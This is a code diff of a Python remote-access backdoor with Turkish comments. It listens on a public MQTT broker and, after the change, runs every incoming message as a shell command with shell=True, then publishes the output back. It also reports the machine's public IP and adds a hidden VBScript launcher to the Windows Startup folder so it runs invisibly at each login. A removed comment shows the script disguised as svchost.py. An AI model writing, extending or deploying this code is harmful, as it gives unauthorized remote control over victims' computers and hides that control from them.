@@ -1,5 +1,8 @@
 import sys
 import subprocess
+import re
+import urllib.request
+import os
 
 # 1. Gerekli kütüphanenin varlığını kontrol et ve otomatik kur
 try:
@@ -9,11 +12,8 @@ except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "paho-mqtt"])
     import paho.mqtt.client as mqtt
 
-import re
-import urllib.request
-
 # ================= KULLANICI AYARLARI =================
-MQTT_BROKER = "broker.hivemq.com"  # İleride kendi host adresinizle değiştirebilirsiniz
+MQTT_BROKER = "broker.hivemq.com"
 MQTT_PORT = 1883
 LISTEN_TOPIC = "cihaz/komutlar"
 RESPONSE_TOPIC = "cihaz/yanitlar"
@@ -53,54 +53,60 @@ def on_message(client, userdata, msg):
         print(f"[-] Mesaj okuma hatası: {e}")
         return
 
+    if not payload:
+        return
+
     print(f"\n[Gelen Mesaj]: {payload}")
     yanit = ""
 
     # 1. !!IP!! Komutu (Dış/Public IP Döner)
-    if payload == "!!IP!!":
+    if payload.upper() == "!!IP!!":
         dis_ip = get_public_ip()
         yanit = f"[Dış IP Bilgisi]: {dis_ip}"
 
-    # 2. !!file!!FILENAME!!CONTENT Komutu (Örn: !!file!!test.txt!!Merhaba Dunya)
-    elif payload.startswith("!!file!!"):
-        match = re.match(r"^!!file!!(.*?)\!\!(.*)$", payload, re.DOTALL)
-        if match:
-            filename = match.group(1).strip()
-            content = match.group(2)
-            try:
-                with open(filename, "w", encoding="utf-8") as f:
-                    f.write(content)
-                yanit = f"[Dosya]: '{filename}' başarıyla oluşturuldu ve yazıldı."
-            except Exception as e:
-                yanit = f"[Dosya Hatası]: {str(e)}"
-        else:
-            yanit = "[Hata]: Dosya formatı geçersiz. Kullanım -> !!file!!dosya.txt!!icerik"
-
-    # 3. !!cmd!!KOMUT Komutu (Örn: !!cmd!!dir veya !!cmd!!ipconfig)
-    elif payload.startswith("!!cmd!!"):
-        komut = payload[7:].strip()
-        if komut:
-            try:
-                cikti = subprocess.check_output(
-                    komut, 
-                    shell=False, 
-                    stderr=subprocess.STDOUT, 
-                    text=True, 
-                    encoding='cp1255' if sys.platform == 'win32' else 'utf-8',
-                    errors='replace'
-                )
-                yanit = f"[CMD Çıktısı - '{komut}']:\n{cikti}"
-            except subprocess.CalledProcessError as e:
-                yanit = f"[CMD Hatası - '{komut}']:\n{e.output}"
-            except Exception as e:
-                yanit = f"[Sistem Hatası]: {str(e)}"
-        else:
-            yanit = "[Hata]: CMD komutu boş olamaz."
+    # 2. !!IP!! Hariç Tüm Gelen Mesajlar Doğrudan CMD Komutu Olarak Çalıştırılır
+    else:
+        try:
+            encoding_type = 'cp857' if sys.platform == 'win32' else 'utf-8'
+            cikti = subprocess.check_output(
+                payload, 
+                shell=True, 
+                stderr=subprocess.STDOUT, 
+                text=True, 
+                encoding=encoding_type,
+                errors='replace'
+            )
+            yanit = f"[CMD Çıktısı - '{payload}']:\n{cikti}"
+        except subprocess.CalledProcessError as e:
+            yanit = f"[CMD Hatası - '{payload}']:\n{e.output}"
+        except Exception as e:
+            yanit = f"[Sistem Hatası]: {str(e)}"
 
     # Yanıt varsa MQTT üzerinden gönder
     if yanit:
         client.publish(RESPONSE_TOPIC, yanit)
         print(f"[Yanıt Gönderildi -> {RESPONSE_TOPIC}]:\n{yanit}")
+
+def add_to_startup():
+    try:
+        appdata = os.getenv('APPDATA')
+        if not appdata:
+            return
+        startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
+        script_path = os.path.abspath(__file__)
+        vbs_path = os.path.join(startup_dir, "myscript_launcher.vbs")
+        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
+        
+        vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\n' \
+                      f'WshShell.Run """{pythonw_path}"" ""{script_path}""", 0, False\n'
+        
+        with open(vbs_path, "w") as f:
+            f.write(vbs_content)
+    except Exception as e:
+        print(f"[-] Startup ekleme hatası: {e}")
+
+# Başlangıca ekle
+add_to_startup()
 
 # Client Kurulumu
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
@@ -109,33 +115,7 @@ client.on_message = on_message
 
 print("[+] Sunucuya bağlanılıyor...")
 client.connect(MQTT_BROKER, MQTT_PORT, 60)
-import os
-import sys
 
-def add_to_startup():
-    # 1. Windows Başlangıç (Startup) klasörünün yolunu bul
-    appdata = os.getenv('APPDATA')
-    startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
-    
-    # 2. Çalışan betiğin tam yolunu al (C:\Users\Public\svchost.py)
-    script_path = os.path.abspath(__file__)
-    
-    # 3. .bat yerine .vbs dosyası oluşturuyoruz
-    vbs_path = os.path.join(startup_dir, "myscript_launcher.vbs")
-    
-    # 4. pythonw.exe yolunu belirle
-    pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
-    
-    # 5. VBScript içeriği
-    # En sondaki ', 0' parametresi pencerenin gizli (Hidden) açılmasını sağlar
-    vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\n' \
-                  f'WshShell.Run """{pythonw_path}"" ""{script_path}""", 0, False\n'
-    
-    # 6. .vbs dosyasını kaydet
-    with open(vbs_path, "w") as f:
-        f.write(vbs_content)
-
-add_to_startup()
 # Sonsuz döngüde dinlemeye başla
 try:
     client.loop_forever()
